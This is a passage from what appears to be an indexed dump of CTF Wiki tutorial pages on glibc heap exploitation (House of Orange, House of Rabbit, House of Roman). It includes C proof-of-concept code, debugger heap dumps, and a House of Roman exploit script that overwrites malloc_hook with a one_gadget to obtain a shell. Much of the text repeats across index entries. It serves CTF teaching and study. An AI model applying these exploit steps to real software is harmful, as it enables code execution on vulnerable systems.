{ void * ptr; ptr = malloc (0x10); ptr = (void *) ((int) ptr + 24); *((long long*)ptr)=fake_size; malloc(0x2000); malloc(0x60); } After the allocation, we can observe that the original heap has passed the brk extension. //The original heap 0x0000000000602000 0x0000000000623000 0x0000000000000000 rw- [heap] //The extended heap 0x0000000000602000 0x0000000000646000 0x0000000000000000 rw- [heap] Our application was assigned to 0x623010 and the original heap was placed in the unsorted bin [+] unsorted_bins[0]: fw=0x602020, bk=0x602020 \u2192 Chunk(addr=0x602030, size=0x1fc0, flags=PREV_INUSE) Because there is a block in the unsorted bin, we will cut this block the next time we allocate it. malloc(0x60); 0x602030 [+] unsorted_bins[0]: fw=0x602090, bk=0x602090 \u2192 Chunk(addr=0x6020a0, size=0x1f50, flags=PREV_INUSE) You can see that the allocated memory is cut from the unsorted bin, the memory layout is as follows 0x602030: 0x00007ffff7dd2208 0x00007ffff7dd2208 <== Unsorted bin list not cleared 0x602040: 0x0000000000602020 0x0000000000602020 0x602050: 0x0000000000000000 0x0000000000000000 0x602060: 0x0000000000000000 0x0000000000000000 0x602070: 0x0000000000000000 0x0000000000000000 0x602080: 0x0000000000000000 0x0000000000000000 0x602090: 0x0000000000000000 0x0000000000001f51 <== cutting the remaining new unsorted bin 0x6020a0: 0x00007ffff7dd1b78 0x00007ffff7dd1b78 0x6020b0: 0x0000000000000000 0x0000000000000000 In fact, the main point of the house of orange is here, after the use of _IO_FILE knowledge, put it in the IO_FILE independent chapter to share.","title":"House of Orange"},{"location":"pwn/linux/glibc-heap/house_of_orange/#house-of-orange","text":"","title":"House of Orange"},{"location":"pwn/linux/glibc-heap/house_of_orange/#introduction","text":"House of Orange differs from other House of XX methods in that it comes from a topic of the same name in Hitcon CTF 2016. Since this method of utilization has not appeared in the previous CTF topic, the use of a series of derivative topics that emerged later is called House of Orange.","title":"Introduction"},{"location":"pwn/linux/glibc-heap/house_of_orange/#overview","text":"The use of House of Orange is quite special. First, the target vulnerability is a vulnerability on the heap. But the special thing is that there is no free function or other function that releases the heap block. We know that you generally want to use heap vulnerabilities, you need to perform malloc and free operations on the heap, but you can't use the free function in House of Orange utilization, so the House of Orange core is free to exploit the exploit.","title":"Overview"},{"location":"pwn/linux/glibc-heap/house_of_orange/#principle","text":"As we mentioned earlier, the core of House of Orange is to get a free unsorted bin without a free function. The principle of this operation is simply that when the top heap size of the current heap is insufficient to meet the size of the application allocation, the original top chunk will be released and placed in the unsorted bin. This can be done without the free function. Get unsorted bins. Let's take a look at the details of this process. Let's assume that the current top chunk does not meet the allocation requirements of malloc. First, the malloc call in the program will be executed into the _int_malloc function of libc.so. In the _int_malloc function, we will check whether the fastbin, small bins, unsorted bin, and large bins can meet the allocation requirements. Size issues are not met. Next, the _int_malloc function will attempt to use the top chunk, where the top chunk will not meet the allocation requirements, so the following branch will be executed. /* Otherwise, relay to handle system-dependent cases */ else { void * p = sysmalloc (nb, av); if (p != NULL && __builtin_expect (perturb_byte, 0)) alloc_perturb (p, bytes); return p; } At this point ptmalloc can not meet the user's request for heap memory operations, you need to execute sysmalloc to apply for more space to the system. But for the heap there are two distribution methods of mmap and brk, we need to make the heap expand in the form of brk, then the original top chunk will be placed in the unsorted bin. In summary, we have to implement brk to extend the top chunk, but to achieve this goal we need to bypass some checks in libc. First, the size of malloc cannot be greater than mmp_.mmap_threshold if ((unsigned long)(nb) >= (unsigned long)(mp_.mmap_threshold) && (mp_.n_mmaps < mp_.n_mmaps_max)) If the chunk size to be allocated is greater than the mmap allocation threshold, the default is 128K, and the memory block allocated by the current process using mmap() is less than the set maximum value, and the mmap() system call will be used to directly request memory from the operating system. There is a check for the top chunk size in the sysmalloc function, as follows assert((old_top == initial_top(av) && old_size == 0) || ((unsigned long) (old_size) >= MINSIZE && prev_inuse(old_top) && ((unsigned long)old_end & pagemask) == 0)); This checks the legitimacy of the top chunk. If this function is called for the first time, the top chunk may not be initialized, so the old_size may be 0. If the top chunk has already been initialized, then the size of the top chunk must be greater than or equal to MINSIZE, because the top chunk contains fencepost, so the top chunk must be larger than MINSIZE. Second, the top chunk must identify that the previous chunk is in the inuse state, and the end chunk's end address must be page-aligned. In addition, the top chunk removes the fencepost size must be smaller than the required chunk size, otherwise the top chunk will be used to split the chunk in the _int_malloc() function. Let's summarize the requirements for forged top chunk size Forged size must be aligned to the memory page size is greater than MINSIZE (0x10) size is smaller than the chunk size + MINSIZE (0x10) applied afterwards The prev inuse bit of size must be 1 After that, the original top chunk will execute _int_free and smoothly enter the unsorted bin.","title":"Principle"},{"location":"pwn/linux/glibc-heap/house_of_orange/#example","text":"Here is a sample program that simulates an overflow overlay to the size field of the top chunk. We tried to reduce the size to achieve the brk extension and put the original top chunk into the unsorted bin. #define fake_size 0x41 int main(void) { void * ptr; ptr = malloc (0x10); ptr = (void *) ((int) ptr + 24); *((long long*)ptr)=fake_size; // overwrite top chunk size malloc(0x60); malloc(0x60); } Here we cover the size of the top chunk as 0x41. Then apply for a heap larger than this size, which is 0x60. But when we execute this example, we find that this program can't be used successfully because the assert is not satisfied and throws an exception. [#0] 0x7ffff7a42428 \u2192 Name: __GI_raise(sig=0x6) [#1] 0x7ffff7a4402a \u2192 Name: __GI_abort() [#2] 0x7ffff7a8a2e8 \u2192 Name: __malloc_assert(assertion=0x7ffff7b9e150 \"(old_top == initial_top (av) && old_size == 0) || ((unsigned long) (old_size) >= MINSIZE && prev_inuse (old_top) && ((unsigned long) old_end & (pagesize - 1)) == 0)\", file=0x7ffff7b9ab85 \"malloc.c\", line=0x95a, function=0x7ffff7b9e998 <__func__.11509> \"sysmalloc\") [#3] 0x7ffff7a8e426 \u2192 Name: sysmalloc (nb = 0x70, av = 0x7ffff7dd1b20 <main_arena> )","title":"example"},{"location":"pwn/linux/glibc-heap/house_of_orange/#the-correct-example","text":"Looking back at the conditions of the assert, we can see that the previously listed entries are satisfied except for the first one. 1. Forged size must be aligned to the memory page What is alignment to a memory page? We know that modern operating systems are memory managed in units of memory pages. The size of a typical memory page is 4 kb. Then our forged size must be aligned to this size. The size of the top chunk before the overlay is 20fe1, and it is calculated that 0x602020+0x20fe0=0x623000 is aligned for 0x1000 (4kb). 0x602000: 0x0000000000000000 0x0000000000000021 0x602010: 0x0000000000000000 0x0000000000000000 0x602020: 0x0000000000000000 0x0000000000020fe1 <== top chunk 0x602030: 0x0000000000000000 0x0000000000000000 Therefore, our fake fake_size can be 0x0fe1, 0x1fe1, 0x2fe1, 0x3fe1, etc. for 4kb aligned size. However, 0x40 does not satisfy the alignment, so it cannot be utilized. #define fake_size 0x1fe1 int main(void) { void * ptr; ptr = malloc (0x10); ptr = (void *) ((int) ptr + 24); *((long long*)ptr)=fake_size; malloc(0x2000); malloc(0x60); } After the allocation, we can observe that the original heap has passed the brk extension. //The original heap 0x0000000000602000 0x0000000000623000 0x0000000000000000 rw- [heap] //The extended heap 0x0000000000602000 0x0000000000646000 0x0000000000000000 rw- [heap] Our application was assigned to 0x623010 and the original heap was placed in the unsorted bin [+] unsorted_bins[0]: fw=0x602020, bk=0x602020 \u2192 Chunk(addr=0x602030, size=0x1fc0, flags=PREV_INUSE) Because there is a block in the unsorted bin, we will cut this block the next time we allocate it. malloc(0x60); 0x602030 [+] unsorted_bins[0]: fw=0x602090, bk=0x602090 \u2192 Chunk(addr=0x6020a0, size=0x1f50, flags=PREV_INUSE) You can see that the allocated memory is cut from the unsorted bin, the memory layout is as follows 0x602030: 0x00007ffff7dd2208 0x00007ffff7dd2208 <== Unsorted bin list not cleared 0x602040: 0x0000000000602020 0x0000000000602020 0x602050: 0x0000000000000000 0x0000000000000000 0x602060: 0x0000000000000000 0x0000000000000000 0x602070: 0x0000000000000000 0x0000000000000000 0x602080: 0x0000000000000000 0x0000000000000000 0x602090: 0x0000000000000000 0x0000000000001f51 <== cutting the remaining new unsorted bin 0x6020a0: 0x00007ffff7dd1b78 0x00007ffff7dd1b78 0x6020b0: 0x0000000000000000 0x0000000000000000 In fact, the main point of the house of orange is here, after the use of _IO_FILE knowledge, put it in the IO_FILE independent chapter to share.","title":"The correct example"},{"location":"pwn/linux/glibc-heap/house_of_rabbit/","text":"House of Rabbit \u00b6 Introduction \u00b6 House of rabbit is a technique for counterfeiting piles that was introduced as early as 2017 but only appeared in the CTF competition in the last two months. We generally use it in the fastbin attack, because other bins such as unsorted bin have better utilization. Principle \u00b6 We know that fastbin will use the same size of the released heap block to manage with a singly linked list, the allocation will check whether the size is reasonable, if it is unreasonable, the program will exit abnormally. The house of rabbit uses the heap blocks in the fastbin at malloc consolidate to merge and the size is not checked to forge a fake heap to prepare for further utilization. Since the original author's [POC] ( https://github.com/shift-crops/House_of_Rabbit ) requires more conditions, here I directly introduce the nature of this attack. Prerequisites : 1. You can modify the fastbin fd pointer or size 2. Can trigger malloc consolidate (merge top or malloc big chunk, etc.) Let\u2019s take a look at POC POC 1 : modify the size of fastbin chunk ` Cpp unsigned long* chunk1=malloc(0x40); //0x602000 unsigned long* chunk2=malloc(0x40); //0x602050 malloc(0x10); free(chunk1); free(chunk2); /* Heap layout 0000| 0x602000 \u2192 0x0 0008| 0x602008 \u2192 0x51 ('Q') 0016| 0x602010 \u2192 0x0 ..... 0080| 0x602050 \u2192 0x0 0088| 0x602058 \u2192 0x51 ('Q') 0096| 0x602060 \u2192 0x602000 \u2192 0x0 0104| 0x602068 \u2192 0x0 ...... 0160| 0x6020a0 \u2192 0x0 0168| 0x6020a8 \u2192 0x21 ('!') 0176| 0x6020b0 \u2192 0x0 0184| 0x6020b8 \u2192 0x0 */ chunk1[-1]=0xa1; //modify chunk1 size to be 0xa1 malloc(0x1000); //allocate a large chunk, trigger malloc consolidate /*Chunk1 overlap with chunk2 now gdb-peda$ telescope 0x602000 100 0000| 0x602000 \u2192 0x0 0008| 0x602008 \u2192 0xa1 0016| 0x602010 \u2192 0x7ffff7dd1c08 \u2192 0x7ffff7dd1bf8 \u2192 0x7ffff7dd1be8 \u2192 0x7ffff7dd1bd8 \u2192 0x7ffff7dd1bc8 (\u2192 ...) 0024| 0x602018 \u2192 0x7ffff7dd1c08 \u2192 0x7ffff7dd1bf8 \u2192 0x7ffff7dd1be8 \u2192 0x7ffff7dd1bd8 \u2192 0x7ffff7dd1bc8 (\u2192 ...) 0032| 0x602020 \u2192 0x0 ..... 0080| 0x602050 \u2192 0x0 0088| 0x602058 \u2192 0x51 ('Q') 0096| 0x602060 \u2192 0x7ffff7dd1bb8 \u2192 0x7ffff7dd1ba8 \u2192 0x7ffff7dd1b98 \u2192 0x7ffff7dd1b88 \u2192 0x7ffff7dd1b78 (\u2192 ...) 0104| 0x602068 \u2192 0x7ffff7dd1bb8 \u2192 0x7ffff7dd1ba8 \u2192 0x7ffff7dd1b98 \u2192 0x7ffff7dd1b88 \u2192 0x7ffff7dd1b78 (\u2192 ...) 0112| 0x602070 \u2192 0x0 0120| 0x602078 \u2192 0x0 .... 0152| 0x602098 \u2192 0x0 0160| 0x6020a0 \u2192 0xa0 0168| 0x6020a8 \u2192 0x20 (' ') gdb-peda $ heapinfo (0x20) fastbin[0]: 0x0 (0x30) fastbin[1]: 0x0 (0x40) fastbin[2]: 0x0 (0x50) fastbin[3]: 0x0 (0x60) fastbin[4]: 0x0 (0x70) fastbin[5]: 0x0 (0x80) fastbin[6]: 0x0 top: 0x603450 (size : 0x1fbb0) last_remainder: 0x0 (size : 0x0) unsortbin: 0x0 (0x050) smallbin[ 3]: 0x602050 (0x0a0) smallbin[ 8]: 0x602000 (overlap chunk with 0x602050(freed) ) */ `POC 2`:modify FD pointer `` `Cpp unsigned long* chunk1=malloc(0x40); //0x602000 unsigned long* chunk2=malloc(0x100);//0x602050 chunk2[1]=0x31; //fake chunk size 0x30 chunk2[7]=0x21 //fake chunk's next chunk chunk2[11]=0x21 //fake chunk's next chunk's next chuck / * Heap laylout 0000| 0x602000 --> 0x0 0008| 0x602008 --> 0x51 ('Q') 0016| 0x602010 --> 0x0 ...... 0080| 0x602050 --> 0x0 0088| 0x602058 --> 0x111 0096| 0x602060 --> 0x0 0104| 0x602068 --> 0x31 ('1') 0112| 0x602070 --> 0x0 ...... 0144| 0x602090 --> 0x0 0152| 0x602098 --> 0x21 ('!') 0160| 0x6020a0 --> 0x0 0168| 0x6020a8 --> 0x0 0176| 0x6020b0 --> 0x0 0184| 0x6020b8 --> 0x21 ('!') 0192| 0x6020c0 --> 0x0 ...... 0352| 0x602160 --> 0x0 0360| 0x602168 --> 0x20ea1 */ free(chunk1); chuck1[0]=0x602060;// modify the fd of chunk1 /* gdb-peda $ heapinfo (0x20) fastbin[0]: 0x0 (0x30) fastbin[1]: 0x0 (0x40) fastbin[2]: 0x0 (0x50) fastbin[3]: 0x602000 --> 0x602060 (size error (0x30)) --> 0x0 */ malloc(5000);// malloc a big chunk to trigger malloc consolidate /* gdb-peda $ heapinfo (0x20) fastbin[0]: 0x0 (0x30) fastbin[1]: 0x0 (0x40) fastbin[2]: 0x0 (0x50) fastbin[3]: 0x0 (0x60) fastbin[4]: 0x0 (0x70) fastbin[5]: 0x0 (0x80) fastbin[6]: 0x0 top: 0x6034f0 (size : 0x1fb10) last_remainder: 0x0 (size : 0x0) unsortbin: 0x0 (0x050) smallbin[ 3]: 0x602000 (0x030) smallbin[ 1]: 0x602060 */ The principle is very simple, is to modify the size of the fastbin chunk (as shown in POC 1 above) to directly construct the overlap chunk, or modify the fd (as shown by POC 2), let it point to a fake chunk, trigger malloc consolidate and let This fake chunk becomes a legal chunk. to sum up \u00b6 The advantage of House of Rabbit is that it is easy to construct an overlap chunk. Since it can be based on fastbin attack, even leak can be used to complete the attack. You can deepen your understanding of this attack through the exercises of the examples. Example \u00b6 HITB-GSEC-XCTF 2018 mutepig To be added","title":"House of Rabbit"},{"location":"pwn/linux/glibc-heap/house_of_rabbit/#house-of-rabbit","text":"","title":"House of Rabbit"},{"location":"pwn/linux/glibc-heap/house_of_rabbit/#introduction","text":"House of rabbit is a technique for counterfeiting piles that was introduced as early as 2017 but only appeared in the CTF competition in the last two months. We generally use it in the fastbin attack, because other bins such as unsorted bin have better utilization.","title":"Introduction"},{"location":"pwn/linux/glibc-heap/house_of_rabbit/#principle","text":"We know that fastbin will use the same size of the released heap block to manage with a singly linked list, the allocation will check whether the size is reasonable, if it is unreasonable, the program will exit abnormally. The house of rabbit uses the heap blocks in the fastbin at malloc consolidate to merge and the size is not checked to forge a fake heap to prepare for further utilization. Since the original author's [POC] ( https://github.com/shift-crops/House_of_Rabbit ) requires more conditions, here I directly introduce the nature of this attack. Prerequisites : 1. You can modify the fastbin fd pointer or size 2. Can trigger malloc consolidate (merge top or malloc big chunk, etc.) Let\u2019s take a look at POC POC 1 : modify the size of fastbin chunk ` Cpp unsigned long* chunk1=malloc(0x40); //0x602000 unsigned long* chunk2=malloc(0x40); //0x602050 malloc(0x10); free(chunk1); free(chunk2); /* Heap layout 0000| 0x602000 \u2192 0x0 0008| 0x602008 \u2192 0x51 ('Q') 0016| 0x602010 \u2192 0x0 ..... 0080| 0x602050 \u2192 0x0 0088| 0x602058 \u2192 0x51 ('Q') 0096| 0x602060 \u2192 0x602000 \u2192 0x0 0104| 0x602068 \u2192 0x0 ...... 0160| 0x6020a0 \u2192 0x0 0168| 0x6020a8 \u2192 0x21 ('!') 0176| 0x6020b0 \u2192 0x0 0184| 0x6020b8 \u2192 0x0 */ chunk1[-1]=0xa1; //modify chunk1 size to be 0xa1 malloc(0x1000); //allocate a large chunk, trigger malloc consolidate /*Chunk1 overlap with chunk2 now gdb-peda$ telescope 0x602000 100 0000| 0x602000 \u2192 0x0 0008| 0x602008 \u2192 0xa1 0016| 0x602010 \u2192 0x7ffff7dd1c08 \u2192 0x7ffff7dd1bf8 \u2192 0x7ffff7dd1be8 \u2192 0x7ffff7dd1bd8 \u2192 0x7ffff7dd1bc8 (\u2192 ...) 0024| 0x602018 \u2192 0x7ffff7dd1c08 \u2192 0x7ffff7dd1bf8 \u2192 0x7ffff7dd1be8 \u2192 0x7ffff7dd1bd8 \u2192 0x7ffff7dd1bc8 (\u2192 ...) 0032| 0x602020 \u2192 0x0 ..... 0080| 0x602050 \u2192 0x0 0088| 0x602058 \u2192 0x51 ('Q') 0096| 0x602060 \u2192 0x7ffff7dd1bb8 \u2192 0x7ffff7dd1ba8 \u2192 0x7ffff7dd1b98 \u2192 0x7ffff7dd1b88 \u2192 0x7ffff7dd1b78 (\u2192 ...) 0104| 0x602068 \u2192 0x7ffff7dd1bb8 \u2192 0x7ffff7dd1ba8 \u2192 0x7ffff7dd1b98 \u2192 0x7ffff7dd1b88 \u2192 0x7ffff7dd1b78 (\u2192 ...) 0112| 0x602070 \u2192 0x0 0120| 0x602078 \u2192 0x0 .... 0152| 0x602098 \u2192 0x0 0160| 0x6020a0 \u2192 0xa0 0168| 0x6020a8 \u2192 0x20 (' ') gdb-peda $ heapinfo (0x20) fastbin[0]: 0x0 (0x30) fastbin[1]: 0x0 (0x40) fastbin[2]: 0x0 (0x50) fastbin[3]: 0x0 (0x60) fastbin[4]: 0x0 (0x70) fastbin[5]: 0x0 (0x80) fastbin[6]: 0x0 top: 0x603450 (size : 0x1fbb0) last_remainder: 0x0 (size : 0x0) unsortbin: 0x0 (0x050) smallbin[ 3]: 0x602050 (0x0a0) smallbin[ 8]: 0x602000 (overlap chunk with 0x602050(freed) ) */ `POC 2`:modify FD pointer `` `Cpp unsigned long* chunk1=malloc(0x40); //0x602000 unsigned long* chunk2=malloc(0x100);//0x602050 chunk2[1]=0x31; //fake chunk size 0x30 chunk2[7]=0x21 //fake chunk's next chunk chunk2[11]=0x21 //fake chunk's next chunk's next chuck / * Heap laylout 0000| 0x602000 --> 0x0 0008| 0x602008 --> 0x51 ('Q') 0016| 0x602010 --> 0x0 ...... 0080| 0x602050 --> 0x0 0088| 0x602058 --> 0x111 0096| 0x602060 --> 0x0 0104| 0x602068 --> 0x31 ('1') 0112| 0x602070 --> 0x0 ...... 0144| 0x602090 --> 0x0 0152| 0x602098 --> 0x21 ('!') 0160| 0x6020a0 --> 0x0 0168| 0x6020a8 --> 0x0 0176| 0x6020b0 --> 0x0 0184| 0x6020b8 --> 0x21 ('!') 0192| 0x6020c0 --> 0x0 ...... 0352| 0x602160 --> 0x0 0360| 0x602168 --> 0x20ea1 */ free(chunk1); chuck1[0]=0x602060;// modify the fd of chunk1 /* gdb-peda $ heapinfo (0x20) fastbin[0]: 0x0 (0x30) fastbin[1]: 0x0 (0x40) fastbin[2]: 0x0 (0x50) fastbin[3]: 0x602000 --> 0x602060 (size error (0x30)) --> 0x0 */ malloc(5000);// malloc a big chunk to trigger malloc consolidate /* gdb-peda $ heapinfo (0x20) fastbin[0]: 0x0 (0x30) fastbin[1]: 0x0 (0x40) fastbin[2]: 0x0 (0x50) fastbin[3]: 0x0 (0x60) fastbin[4]: 0x0 (0x70) fastbin[5]: 0x0 (0x80) fastbin[6]: 0x0 top: 0x6034f0 (size : 0x1fb10) last_remainder: 0x0 (size : 0x0) unsortbin: 0x0 (0x050) smallbin[ 3]: 0x602000 (0x030) smallbin[ 1]: 0x602060 */ The principle is very simple, is to modify the size of the fastbin chunk (as shown in POC 1 above) to directly construct the overlap chunk, or modify the fd (as shown by POC 2), let it point to a fake chunk, trigger malloc consolidate and let This fake chunk becomes a legal chunk.","title":"Principle"},{"location":"pwn/linux/glibc-heap/house_of_rabbit/#to-sum-up","text":"The advantage of House of Rabbit is that it is easy to construct an overlap chunk. Since it can be based on fastbin attack, even leak can be used to complete the attack. You can deepen your understanding of this attack through the exercises of the examples.","title":"to sum up"},{"location":"pwn/linux/glibc-heap/house_of_rabbit/#example","text":"HITB-GSEC-XCTF 2018 mutepig To be added","title":"Example"},{"location":"pwn/linux/glibc-heap/house_of_roman/","text":"House of Roman \u00b6 Introduction \u00b6 House of Roman This trick is simply a small trick combined with fastbin attack and Unsortbin attack. Summary \u00b6 This technique is used for bypass ALSR, which uses a 12-bit burst to achieve the shell. It can be exploited with just one UAF vulnerability and the ability to create chunks of any size. Principle and display \u00b6 The author provided us with a demo for display, and the entire process can be divided into three steps. Point FD to malloc_hook Fix 0x71 Freelist Write one gadget to malloc_hook First a rough analysis of the demo: Open protection: [ * ] '/media/psf/Home/Desktop/MyCTF/House-Of-Roman/new_chall' Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: PIE enabled There are three main functions in the sample question, Malloc, Write, and Free. switch ( v4 ) { case 1 : puts ( \"Malloc\" ); v5 = malloc_chunk ( \"Malloc\" ); if ( ! v5 ) puts ( \"Error\" ); break ; case 2 : puts ( \"Write\" ); write_chunk ( \"Write\" ); break ; case 3 : puts ( \"Free\" ); free_chunk (); break ; default : puts ( \"Invalid choice\" ); break ; In the Free function, there is a dangling pointer caused by the pointer not being zeroed. void free_chunk () { unsigned int v0 ; // [rsp+Ch] [rbp-4h]@1 printf ( \"Next index:\" ); __isoc99_scanf ( \"%d\" , & v0 ); if ( v0 <= 0x13 ) free ( heap_ptrs [( unsigned __int64 ) v0 ]); } Step 1 \u00b6 First fake a chunk, the size of the chunk is 0x61. Then we use partial overwrite to point the FD to the forged chunk (of course, we can also do this with UAF). Forged chunk size pwndbg> 0x555555757050: 0x41414141 0x41414141 0x41414141 0x41414141 0x555555757060: 0x41414141 0x41414141 0x41414141 0x41414141 0x555555757070: 0x41414141 0x41414141 0x41414141 0x41414141 0x555555757080: 0x41414141 0x41414141 0x41414141 0x41414141 0x555555757090: 0x41414141 0x41414141 0x61 0x0 <---------- Here, we are free of chunk 1, this time we can get an unsortbin 0x555555757020 PREV_INUSE { prev_size = 0x0, size = 0xd1, fd = 0x7ffff7dd1b58 <main_arena+88> , bk = 0x7ffff7dd1b58 <main_arena+88> , fd_nextsize = 0x4141414141414141, bk_nextsize = 0x4141414141414141 } Next, we redistribute the chunk 0xd1 and modify its size to 0x71. pwndbg> x/40ag 0x555555757020 0x555555757020: 0x4141414141414141 0x71 0x555555757030: 0x7ffff7dd1b58 <main_arena+88> 0x7ffff7dd1b58 <main_arena+88> 0x555555757040: 0x4141414141414141 0x4141414141414141 0x555555757050: 0x4141414141414141 0x4141414141414141 0x555555757060: 0x4141414141414141 0x4141414141414141 0x555555757070: 0x4141414141414141 0x4141414141414141 0x555555757080: 0x4141414141414141 0x4141414141414141 0x555555757090: 0x4141414141414141 0x61 We then need to fix this 0x71 FD freelist and fake it as a block that has already been released. pwndbg> x/40ag 0x555555757000 0x555555757000: 0x0 0x21 0x555555757010: 0x4141414141414141 0x4141414141414141 0x555555757020: 0x4141414141414141 0x71 <---------- free 0x71 0x555555757030: 0x7ffff7dd1b58 <main_arena+88> 0x7ffff7dd1b58 <main_arena+88> 0x555555757040: 0x4141414141414141 0x4141414141414141 0x555555757050: 0x4141414141414141 0x4141414141414141 0x555555757060: 0x4141414141414141 0x4141414141414141 0x555555757070: 0x4141414141414141 0x4141414141414141 0x555555757080: 0x4141414141414141 0x4141414141414141 0x555555757090: 0x4141414141414141 0x61 0x5555557570a0: 0x0 0x0 0x5555557570b0: 0x0 0x0 0x5555557570c0: 0x0 0x0 0x5555557570d0: 0x0 0x0 0x5555557570e0: 0x0 0x0 0x5555557570f0: 0xd0 0x71 <---------- free 0x71 0x555555757100: 0x0 0x0 0x555555757110: 0x0 0x0 0x555555757120: 0x0 0x0 0x555555757130: 0x0 0x0 libc : 0x7ffff7a23d28 (\"malloc_hook\") At this time our FD is already near the malloc hook and is not ready for blasting. Step 2 \u00b6 We only need to release the fix by releasing a chunk of size 0x71. Step 3 \u00b6 Take advantage of unsortebin's attacking techniques and use the editing function to write onegadet. Exp Analysis \u00b6 Assign 3 chunk , set p64(0x61) at B + 0x78 , the function is fake size for the following fastbin attack create ( 0x18 , 0 ) # 0x20 create ( 0xc8 , 1 ) # d0 create ( 0x65 , 2 ) # 0x70 info ( \"create 2 chunk, 0x20, 0xd8\" ) fake = \"A\" * 0x68 fake += p64 ( 0x61 ) ## fake size edit ( 1 , fake ) info ( \"fake\" ) Release B and assign the same size again to B , where B+0x10 and B+0x18 have the address of main_arean . Assign 3 fastbin and off by one to modify B->size = 0x71 free(1) create(0xc8,1) create(0x65,3) # b create(0x65,15) create(0x65,18) over = \"A\"*0x18 # off by one over += \"\\x71\" # set chunk 1's size --> 0x71 edit(0,over) info(\"use off by one , chunk 1's size --> 0x71\") Generate two fastbin s, then use uaf to write some addresses and chain B to fastbin free ( 2 ) free ( 3 ) info ( \"Create two 0x70 fastbin\" ) heap_po = \" \\x20 \" edit ( 3 , heap_po ) info ( \"Link chunk'1 into fastbin\" ) Debug to see the status of fastbin at this time pwndbg> fastbins fastbins 0x20: 0x0 0x30: 0x0 0x40: 0x0 0x50: 0x0 0x60: 0x0 0x70: 0x555555757160 \u2014\u25b8 0x555555757020 \u2014\u25b8 0x7ffff7dd1b78 (main_arena+88) \u25c2\u2014 0x7ffff7dd1b78 0x80: 0x0 0x555555757020 is chunk B Then by modifying the low 2 bytes of B->fd , make B->fd= malloc_hook - 0x23 # malloc_hook above malloc_hook_nearly = \"\\xed\\x1a\" edit(1,malloc_hook_nearly) info(\"Partial write, modify fastbin->fd ---> malloc_hook\") Then allocate 3 `xk of 0x70 , and you can get the chunk where malloc_hook is located. create(0x65,0) create(0x65,0) create(0x65,0) Then free drop E , enter fastbin , use uaf to set E->fd = 0 , fix fastbin free(15) edit(15,p64(0x00)) info(\"Generate 0x71 fastbin again, modify fd =0, fix fastbin\") Then an unsorted bin attack, making the value of malloc_hook main_arena+88 create(0xc8,1) create(0xc8,1) create(0x18,2) create(0xc8,3) create(0xc8,4) free(1) po = \"B\" * 8 po + = \"\\x00\\x1b\" edit (1, po) create(0xc8,1) info(\"unsorted bin makes malloc_hook have the address of libc\") Make the malloc_hook address of one_gadget by modifying the lower three bytes of malloc_hook over = \"R\"*0x13 # padding for malloc_hook over + = \"\\xa4\\xd2\\xaf\" edit(0,over) info(\"malloc_hook to one_gadget\") Then free twice with the same chunk , trigger malloc_printerr , getshell free(18) free(18) Link \u00b6 https://gist.github.com/romanking98/9aab2804832c0fb46615f025e8ffb0bc https://github.com/romanking98/House-Of-Roman https://xz.aliyun.com/t/2316","title":"House of Roman"},{"location":"pwn/linux/glibc-heap/house_of_roman/#house-of-roman","text":"","title":"House of Roman"},{"location":"pwn/linux/glibc-heap/house_of_roman/#introduction","text":"House of Roman This trick is simply a small trick combined with fastbin attack and Unsortbin attack.","title":"Introduction"},{"location":"pwn/linux/glibc-heap/house_of_roman/#summary","text":"This technique is used for bypass ALSR, which uses a 12-bit burst to achieve the shell. It can be exploited with just one UAF vulnerability and the ability to create chunks of any size.","title":"Summary"},{"location":"pwn/linux/glibc-heap/house_of_roman/#principle-and-display","text":"The author provided us with a demo for display, and the entire process can be divided into three steps. Point FD to malloc_hook Fix 0x71 Freelist Write one gadget to malloc_hook First a rough analysis of the demo: Open protection: [ * ] '/media/psf/Home/Desktop/MyCTF/House-Of-Roman/new_chall' Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: PIE enabled There are three main functions in the sample question, Malloc, Write, and Free. switch ( v4 ) { case 1 : puts ( \"Malloc\" ); v5 = malloc_chunk ( \"Malloc\" ); if ( ! v5 ) puts ( \"Error\" ); break ; case 2 : puts ( \"Write\" ); write_chunk ( \"Write\" ); break ; case 3 : puts ( \"Free\" ); free_chunk (); break ; default : puts ( \"Invalid choice\" ); break ; In the Free function, there is a dangling pointer caused by the pointer not being zeroed. void free_chunk () { unsigned int v0 ; // [rsp+Ch] [rbp-4h]@1 printf ( \"Next index:\" ); __isoc99_scanf ( \"%d\" , & v0 ); if ( v0 <= 0x13 ) free ( heap_ptrs [( unsigned __int64 ) v0 ]); }","title":"Principle and display"},{"location":"pwn/linux/glibc-heap/house_of_roman/#step-1","text":"First fake a chunk, the size of the chunk is 0x61. Then we use partial overwrite to point the FD to the forged chunk (of course, we can also do this with UAF). Forged chunk size pwndbg> 0x555555757050: 0x41414141 0x41414141 0x41414141 0x41414141 0x555555757060: 0x41414141 0x41414141 0x41414141 0x41414141 0x555555757070: 0x41414141 0x41414141 0x41414141 0x41414141 0x555555757080: 0x41414141 0x41414141 0x41414141 0x41414141 0x555555757090: 0x41414141 0x41414141 0x61 0x0 <---------- Here, we are free of chunk 1, this time we can get an unsortbin 0x555555757020 PREV_INUSE { prev_size = 0x0, size = 0xd1, fd = 0x7ffff7dd1b58 <main_arena+88> , bk = 0x7ffff7dd1b58 <main_arena+88> , fd_nextsize = 0x4141414141414141, bk_nextsize = 0x4141414141414141 } Next, we redistribute the chunk 0xd1 and modify its size to 0x71. pwndbg> x/40ag 0x555555757020 0x555555757020: 0x4141414141414141 0x71 0x555555757030: 0x7ffff7dd1b58 <main_arena+88> 0x7ffff7dd1b58 <main_arena+88> 0x555555757040: 0x4141414141414141 0x4141414141414141 0x555555757050: 0x4141414141414141 0x4141414141414141 0x555555757060: 0x4141414141414141 0x4141414141414141 0x555555757070: 0x4141414141414141 0x4141414141414141 0x555555757080: 0x4141414141414141 0x4141414141414141 0x555555757090: 0x4141414141414141 0x61 We then need to fix this 0x71 FD freelist and fake it as a block that has already been released. pwndbg> x/40ag 0x555555757000 0x555555757000: 0x0 0x21 0x555555757010: 0x4141414141414141 0x4141414141414141 0x555555757020: 0x4141414141414141 0x71 <---------- free 0x71 0x555555757030: 0x7ffff7dd1b58 <main_arena+88> 0x7ffff7dd1b58 <main_arena+88> 0x555555757040: 0x4141414141414141 0x4141414141414141 0x555555757050: 0x4141414141414141 0x4141414141414141 0x555555757060: 0x4141414141414141 0x4141414141414141 0x555555757070: 0x4141414141414141 0x4141414141414141 0x555555757080: 0x4141414141414141 0x4141414141414141 0x555555757090: 0x4141414141414141 0x61 